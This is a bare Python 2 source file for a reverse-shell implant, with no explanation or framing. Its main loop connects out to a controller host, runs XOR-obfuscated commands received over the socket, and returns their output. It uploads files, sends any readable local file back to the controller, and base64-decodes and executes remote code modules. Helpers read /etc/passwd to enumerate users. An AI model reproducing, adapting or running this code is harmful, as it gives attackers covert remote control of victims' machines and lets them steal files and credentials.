#!/usr/bin/env python
import os, sys, re
import socket
import time
import shutil
from base64 import *
from subprocess import Popen,PIPE,STDOUT,call

socksize = 4096                            
activePID = []
home = os.environ['HOME']
username = os.environ['USERNAME']
if os.geteuid() != 0:
    currentuser = "nonroot"
else:
    currentuser = "root"


def xor(string, key):
    data = ''
    for char in string:
        for ch in key:
            char = chr(ord(char) ^ ord(ch))
        data += char
    return data


def users():
    userlist = []
    if os.access('/etc/passwd', os.R_OK):
        passwd = open('/etc/passwd')
        for line in passwd:
            fields = line.split(':')
            uid = int(fields[2])
            if uid > 500 and uid < 32328:
                userlist.append(fields[0])


def whereis(program):
    for path in os.environ.get('PATH', '').split(':'):
        if os.path.exists(os.path.join(path, program)) and \
            not os.path.isdir(os.path.join(path, program)):
                return os.path.join(path, program)
    return None


def module_handler(module, modname):
    status_msg("[~] Module: %s\n" % modname)
    exec(module)
    connection.send(xor("[%s] shell => " % username, pin))


def status_msg(message):
    connection.send(xor("%s" % message, pin))


def cat_file(filename):
    if os.path.exists(filename) and os.access(filename, os.R_OK):
        catfile = open(filename, "rb")
        connection.send(xor("[*] Contents of %s" % filename, pin))
        for lines in catfile.readlines():
            connection.sendall(lines)
        catfile.close()


def save_file(filename):
    if os.path.exists(filename) and os.access(filename, os.R_OK):
        savefile = open(filename, "rb")
        filedata = savefile.read()
        savefile.close()
        connection.send(":savef %s" % filename)
        time.sleep(2)
        connection.sendall( filedata )
    else:
        pass


def cmd_exec(command):
    proc = Popen(command,
              shell=True,
              stdout=PIPE,
              stderr=PIPE,
               stdin=PIPE,
               )
    stdout, stderr = proc.communicate()
    connection.sendall( stdout )


def cmd_save(command, textfile):
    try:
        output = subprocess.check_output(command, shell=True)
        output = output.split("\n")
        new = file(textfile, "wb")
        for lines in output:
            new.write(lines+"\n")
        new.close()
        save_file(textfile)
        os.system("rm %s" % textfile)
    except:
        status_msg("error piping command output to file!")


def main(HOST, PORT, pin):
    global connection
    connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        connection.connect((HOST, PORT))
        connection.send(xor("[%s] shell => " % username, pin))
    except:
        sys.exit(2)
                                        
    while True:                                     
        cmd = connection.recv(socksize)
        cmd2 = xor(cmd, pin)
        proc = Popen(cmd2,
             shell=True,
             stdout=PIPE,
             stderr=PIPE,
             stdin=PIPE,
             )
        stdout, stderr = proc.communicate()
        if cmd.startswith('cd'):
            try:
                destination = cmd[3:].replace('\n','')
                if os.path.isdir(destination):
                    os.chdir(destination)
                    current = os.getcwd()
                    connection.send(xor("[*] current directory: %s" % current, pin))
                    connection.send(xor("[%s] shell => " % username, pin))
                else:
                    connection.send("[!] Directory does not exist") 
                    connection.send(xor("[%s] shell => " % username, pin))
            except IndexError:
                pass
        if cmd2.startswith(":upload"):
            getname = cmd2.split(" ")
            rem_file = getname[1]
            filename = rem_file.replace("/","_")
            filedata = connection.recv(socksize)
            filedata = xor(filedata, pin)
            newfile = file(filename, "wb")
            newfile.write(filedata)
            newfile.close()
            if os.path.isfile(filename):
                connection.send(xor("[~] File upload complete!\n", pin))
            if not os.path.isfile(filename):
                connection.send(xor("[!] File upload failed! Please try again\n", pin))
        elif cmd2.startswith(":download"):
            getname = cmd2.split(" ")
            loc_file = getname[1]
            if os.path.exists(loc_file) is True:
                sendfile = open(loc_file, "r")
                filedata = sendfile.read()
                sendfile.close()
                senddata = xor(filedata, pin)
                connection.sendall(senddata)
            else:
                connection.send(xor("[!] File not found!", pin))
        elif cmd2.startswith(":exec"):
            try:
                getname = cmd2.split(" ")
                modname = getname[1]
                mod_data = ""
                data = connection.recv(socksize)
                mod_data += data
                connection.send(xor("Complete", pin))
                modexec = b64decode(mod_data)
                module_handler(modexec, modname)
            except IndexError:
                pass
        elif cmd2 == (":quit"):
            connection.close()
            os._exit(0)
            sys.exit(0)
        elif proc:
            connection.send(xor( stdout , pin))
            connection.send(xor("[%s] shell => " % username, pin))

    connection.close() 
    os._exit(0)


